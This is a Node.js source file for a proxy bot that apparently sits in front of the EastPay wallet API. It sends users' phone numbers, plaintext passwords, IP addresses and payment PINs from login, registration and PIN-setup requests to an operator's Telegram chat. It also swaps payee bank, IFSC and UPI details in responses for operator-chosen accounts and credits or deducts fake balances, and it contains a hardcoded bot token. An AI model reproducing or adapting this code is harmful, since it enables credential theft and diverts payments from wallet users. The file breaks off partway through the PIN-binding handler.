const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const crypto = require('crypto');

const app = express();
const ORIGINAL_API = 'https://api.eastpay-wallet.com';
const BOT_TOKEN = '8568538419:AAE90H83MD1M4y_iDqMlNDIPwBH2ft4uqW0';
const WEBHOOK_URL = 'https://dschf.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  userOverrides: {},
  trackedUsers: {}
};

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 15000;
const tokenUserMap = {};
const userPhoneMap = {};
let debugNextResponse = false;

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('dschfData');
    if (raw) {
      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else { cachedData = { ...DEFAULT_DATA }; }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) { console.error('Redis load error:', e.message); }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  const skipMerge = data._skipOverrideMerge;
  if (skipMerge) delete data._skipOverrideMerge;
  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
  try {
    if (!skipMerge) {
      const current = await redis.get('dschfData');
      if (current && typeof current === 'object' && current.userOverrides) {
        if (!data.userOverrides) data.userOverrides = {};
        for (const uid of Object.keys(current.userOverrides)) {
          const cur = current.userOverrides[uid];
          const loc = data.userOverrides[uid];
          if (!loc) { data.userOverrides[uid] = cur; }
          else {
            if (cur.addedBalance !== undefined && loc.addedBalance === undefined) loc.addedBalance = cur.addedBalance;
          }
        }
      }
    }
    cachedData = data;
    cacheTime = Date.now();
    await redis.set('dschfData', data);
  } catch(e) {
    console.error('Redis save error:', e.message);
    cachedData = data;
    cacheTime = Date.now();
  }
}

function getTokenFromReq(req) {
  return req.headers['authorization'] || req.headers['token'] || req.headers['logintoken'] || req.headers['apptoken'] || '';
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  if (tok && tok.length > 10) {
    const key = tok.substring(0, 100);
    tokenUserMap[key] = String(userId);
    if (redis) redis.hset('dschfTokenMap', key, String(userId)).catch(()=>{});
  }
}

async function getUserIdFromToken(req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return null;
  const key = tok.substring(0, 100);
  if (tokenUserMap[key]) return tokenUserMap[key];
  if (redis) {
    try {
      const stored = await redis.hget('dschfTokenMap', key);
      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
    } catch(e) {}
  }
  return null;
}

async function extractUserId(req, jsonResp) {
  const fromToken = await getUserIdFromToken(req);
  if (fromToken) return fromToken;
  const body = req.parsedBody || {};
  const uid = body.userId || body.userid || body.id || body.memberId || '';
  if (uid) return String(uid);
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.userId || respData.userid || respData.id || respData.memberId || '';
    if (rid) return String(rid);
  }
  const authHeader = getTokenFromReq(req);
  if (authHeader) {
    try {
      const clean = authHeader.replace('Bearer ', '');
      const parts = clean.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        if (payload.userId) return String(payload.userId);
        if (payload.sub) return String(payload.sub);
        if (payload.id) return String(payload.id);
      }
    } catch(e) {}
  }
  return '';
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || ''
  };
  if (phone) userPhoneMap[String(userId)] = phone;
}

function isLogOff(data, userId) {
  if (!userId) return false;
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  return uo && uo.logOff === true;
}

const logOffTokens = new Set();
const checkedTokens = new Set();

function isLogOffByTokenFast(data, req) {
  const tok = getTokenFromReq(req);
  if (!tok || tok.length < 10) return false;
  const tKey = tok.substring(0, 100);
  if (logOffTokens.has(tKey)) return true;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  return false;
}

function getPhone(data, userId) {
  if (!userId) return '';
  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  if (tracked && tracked.phone) { userPhoneMap[String(userId)] = tracked.phone; return tracked.phone; }
  return '';
}

function getActiveBank(data, userId) {
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    data._rotatedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

async function getActiveBankAndSave(data, userId) {
  const bank = getActiveBank(data, userId);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
  }).join('\n');
}

app.use(async (req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.parsedBody = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.parsedBody = Object.fromEntries(params);
      } else { req.parsedBody = {}; }
    } catch(e) { req.parsedBody = {}; }
    next();
  });
});

async function proxyFetch(req) {
  const url = ORIGINAL_API + req.originalUrl;
  const fwd = {};
  const clientIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : (req.headers['x-real-ip'] || '');
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'api.eastpay-wallet.com';
  if (clientIp) {
    fwd['x-forwarded-for'] = clientIp;
    fwd['x-real-ip'] = clientIp;
  }
  const opts = { method: req.method, headers: fwd };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  let jsonResp = null;
  try { jsonResp = JSON.parse(respBody); } catch(e) {}
  return { response, respBody, respHeaders, jsonResp };
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  if (jsonResp.data) return jsonResp.data;
  if (jsonResp.body) return jsonResp.body;
  if (jsonResp.result) return jsonResp.result;
  return null;
}

function sendJson(res, headers, json, fallback) {
  const body = json ? JSON.stringify(json) : fallback;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
  headers['pragma'] = 'no-cache';
  delete headers['etag'];
  delete headers['last-modified'];
  res.writeHead(200, headers);
  res.end(body);
}

async function transparentProxy(req, res) {
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (jsonResp) {
      const rd = getResponseData(jsonResp);
      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.id || rd.memberId || '') : '';
      if (uid) saveTokenUserId(req, uid);
    }
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
  'customername': 'accountHolder', 'customerrealname': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
  'collectionbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
  'customerupi': 'upiId'
};

function replaceBankInUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'pa'], value: bank.accountNo },
    { names: ['name', 'accountName', 'account_name', 'pn'], value: bank.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'IFSC'], value: bank.ifsc }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    if (!group.value) continue;
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  if (bank.upiId && result.includes('upi://pay')) {
    result = result.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
    if (bank.accountHolder) result = result.replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
  }
  return result;
}

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else { deepReplace(val, bank, originalValues, depth + 1); }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    }
    if (typeof val === 'string') {
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, bank);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) obj[key] = obj[key].split(origVal).join(bank[mappedF]);
        }
      }
    }
  }
}

async function proxyAndReplaceBankDetails(req, res, label) {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  if (!data.botEnabled) { await transparentProxy(req, res); return; }
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (!jsonResp) { res.writeHead(response.status, respHeaders); res.end(respBody); return; }
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const effectiveId = userId || reqUserId || '';
    const bank = await getActiveBankAndSave(data, effectiveId);
    if (bank) {
      deepReplace(jsonResp, bank, {}, 0);
      if (debugNextResponse) {
        debugNextResponse = false;
        if (data.adminChatId && bot) {
          const dbgMsg = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
          bot.sendMessage(data.adminChatId, `🔍 Debug ${label}:\n\`\`\`\n${dbgMsg}\n\`\`\``, { parse_mode: 'Markdown' }).catch(()=>{});
        }
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
    if (!isLogOff(data, effectiveId) && data.adminChatId && bot) {
      const phone = getPhone(data, effectiveId);
      bot.sendMessage(data.adminChatId, `${label} [${effectiveId || 'N/A'}]${phone ? ' 📱' + phone : ''}${bank ? ' → Bank: ' + bank.accountHolder : ''}`).catch(()=>{});
    }
    if (effectiveId) trackUser(data, effectiveId, label);
  } catch(e) { await transparentProxy(req, res); }
}

app.get('/setup-webhook', async (req, res) => {
  await ensureWebhook();
  res.json({ ok: true, webhook: WEBHOOK_URL });
});

app.get('/health', async (req, res) => {
  const data = await loadData();
  res.json({
    status: 'running',
    proxy: data.botEnabled ? 'ON' : 'OFF',
    banks: data.banks.length,
    tracked: Object.keys(data.trackedUsers || {}).length,
    app: 'EastPay (dschf)'
  });
});

app.post('/bot-webhook', async (req, res) => {
  await ensureWebhook();
  const body = req.parsedBody || {};
  const msg = body.message;
  if (!msg || !msg.text) return res.sendStatus(200);
  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const data = await loadData(true);

  try {
    if (text === '/start') {
      data.adminChatId = chatId;
      await saveData(data);
      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/debug - Debug next response');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const active = getActiveBank(data, null);
      const idCount = Object.keys(data.userOverrides || {}).length;
      let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
      if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
      else m += '\n\n⚠️ No active bank';
      await bot.sendMessage(chatId, m);
      return res.sendStatus(200);
    }

    if (text === '/on') { data.botEnabled = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
    if (text === '/off' && !text.startsWith('/off ')) { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace response dump'); return res.sendStatus(200); }

    if (text.startsWith('/off log ')) {
      const targetId = text.substring(9).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
      data.userOverrides[targetId].logOff = true;
      await saveData(data);
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) logOffTokens.add(tKey);
      }
      await bot.sendMessage(chatId, `🔇 Logging OFF for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/on log ')) {
      const targetId = text.substring(8).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId]) {
        delete data.userOverrides[targetId].logOff;
        await saveData(data);
      }
      for (const [tKey, uid] of Object.entries(tokenUserMap)) {
        if (String(uid) === String(targetId)) { logOffTokens.delete(tKey); checkedTokens.delete(tKey); }
      }
      await bot.sendMessage(chatId, `📡 Logging ON for user ${targetId}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/add ')) {
      const parts = text.substring(5).trim().split(/\s+/);
      if (parts.length < 2) { await bot.sendMessage(chatId, '❌ Format: /add <userId> <amount>'); return res.sendStatus(200); }
      const [targetUserId, amountStr] = parts;
      const amount = parseFloat(amountStr);
      if (isNaN(amount) || amount <= 0) { await bot.sendMessage(chatId, '❌ Invalid amount'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
      const originalBal = tracked ? (parseFloat(tracked.balance) || 0) : 0;
      const updatedBal = originalBal + data.userOverrides[targetUserId].addedBalance;
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({
        type: 'add', userId: targetUserId, amount,
        totalAdded: data.userOverrides[targetUserId].addedBalance,
        originalBalance: tracked ? tracked.balance : 'N/A',
        updatedBalance: updatedBal,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Estimated balance: ₹${updatedBal}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/deduct ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      if (parts.length < 2) { await bot.sendMessage(chatId, '❌ Format: /deduct <userId> <amount>'); return res.sendStatus(200); }
      const [targetUserId, amountStr] = parts;
      const amount = parseFloat(amountStr);
      if (isNaN(amount) || amount <= 0) { await bot.sendMessage(chatId, '❌ Invalid amount'); return res.sendStatus(200); }
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
      const originalBal2 = tracked ? (parseFloat(tracked.balance) || 0) : 0;
      const updatedBal2 = originalBal2 + data.userOverrides[targetUserId].addedBalance;
      if (!data.balanceHistory) data.balanceHistory = [];
      data.balanceHistory.push({
        type: 'deduct', userId: targetUserId, amount,
        totalAdded: data.userOverrides[targetUserId].addedBalance,
        originalBalance: tracked ? tracked.balance : 'N/A',
        updatedBalance: updatedBal2,
        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: (tracked && tracked.phone) || ''
      });
      data._skipOverrideMerge = true;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Estimated balance: ₹${updatedBal2}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/remove balance ')) {
      const targetId = text.substring(16).trim();
      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
      if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
        const removed = data.userOverrides[targetId].addedBalance;
        delete data.userOverrides[targetId].addedBalance;
        data._skipOverrideMerge = true;
        await saveData(data);
        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}`);
      } else { await bot.sendMessage(chatId, `ℹ️ User ${targetId} has no fake balance.`); }
      return res.sendStatus(200);
    }

    if (text === '/history' || text.startsWith('/history ')) {
      const historyTarget = text.startsWith('/history ') ? text.substring(9).trim() : '';
      const history = data.balanceHistory || [];
      if (history.length === 0) { await bot.sendMessage(chatId, '📋 No balance history yet.'); return res.sendStatus(200); }
      const filtered = historyTarget ? history.filter(h => h.userId === historyTarget) : history;
      if (filtered.length === 0) { await bot.sendMessage(chatId, `📋 No history for user ${historyTarget}`); return res.sendStatus(200); }
      const last10 = filtered.slice(-10);
      let msg = '📋 Balance History (last 10):\n━━━━━━━━━━━━━━━━━━\n';
      for (const h of last10) {
        msg += `${h.type === 'add' ? '➕' : '➖'} ${h.userId} | ₹${h.amount} | Total: ₹${h.totalAdded} | ${h.time}\n`;
      }
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      await bot.sendMessage(chatId, `💳 Banks:\n${bankListText(data)}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).trim().split('|').map(s => s.trim());
      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank holder|accountNo|ifsc|bankName|upiId'); return res.sendStatus(200); }
      const bank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
      data.banks.push(bank);
      if (data.banks.length === 1) data.activeIndex = 0;
      await saveData(data);
      await bot.sendMessage(chatId, `✅ Bank added: ${bank.accountHolder} | ${bank.accountNo}\n📋 Total: ${data.banks.length}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/removebank ')) {
      const idx = parseInt(text.substring(12).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      const removed = data.banks.splice(idx, 1)[0];
      if (data.activeIndex >= data.banks.length) data.activeIndex = data.banks.length - 1;
      await saveData(data);
      await bot.sendMessage(chatId, `🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
      data.activeIndex = idx;
      await saveData(data);
      const b = data.banks[idx];
      await bot.sendMessage(chatId, `✅ Active bank: ${b.accountHolder} | ${b.accountNo}`);
      return res.sendStatus(200);
    }

    if (text === '/users') {
      const users = data.trackedUsers || {};
      const keys = Object.keys(users);
      if (keys.length === 0) { await bot.sendMessage(chatId, '📋 No tracked users.'); return res.sendStatus(200); }
      let msg = '👥 Tracked Users:\n━━━━━━━━━━━━━━━━━━\n';
      for (const uid of keys.slice(-20)) {
        const u = users[uid];
        msg += `👤 ${uid}${u.phone ? ' 📱' + u.phone : ''} | ${u.lastAction || 'N/A'} | ${u.lastSeen || 'N/A'}\n`;
      }
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

  } catch(e) {
    await bot.sendMessage(chatId, `❌ Error: ${e.message}`).catch(()=>{});
  }
  return res.sendStatus(200);
});

app.post('/app/auth/login', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const phone = body.phone || body.mobile || body.username || '';
    const pwd = body.password || body.pwd || '';
    const respData = getResponseData(jsonResp);
    let userId = '';
    if (respData && typeof respData === 'object') {
      userId = respData.userId || respData.id || respData.memberId || '';
      if (respData.loginToken || respData.token) {
        const tok = respData.loginToken || respData.token;
        if (userId) {
          tokenUserMap[tok.substring(0, 100)] = String(userId);
          if (redis) redis.hset('dschfTokenMap', tok.substring(0, 100), String(userId)).catch(()=>{});
        }
      }
      if (respData.sessionKey) {
        if (userId) {
          tokenUserMap['session_' + String(userId)] = String(userId);
        }
      }
    }
    if (userId) {
      saveTokenUserId(req, String(userId));
      trackUser(data, String(userId), 'Login', phone);
      saveData(data).catch(()=>{});
    }
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/auth/register', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const phone = body.phone || body.mobile || '';
    const pwd = body.password || body.pwd || '';
    const inviteCode = body.inviteCode || body.referralCode || '';
    const respData = getResponseData(jsonResp);
    let userId = '';
    if (respData && typeof respData === 'object') {
      userId = respData.userId || respData.id || '';
    }
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📝 Register\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n🎫 Invite: ${inviteCode || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/secure/pin/bind', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
    const pin = body.pin || body.securePin || body.payPassword || body.payPin || qp.pin || qp.securePin || '';
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📌 PIN SET\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📊 Status: ${jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success) ? '✅ Success' : '❌ Failed'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
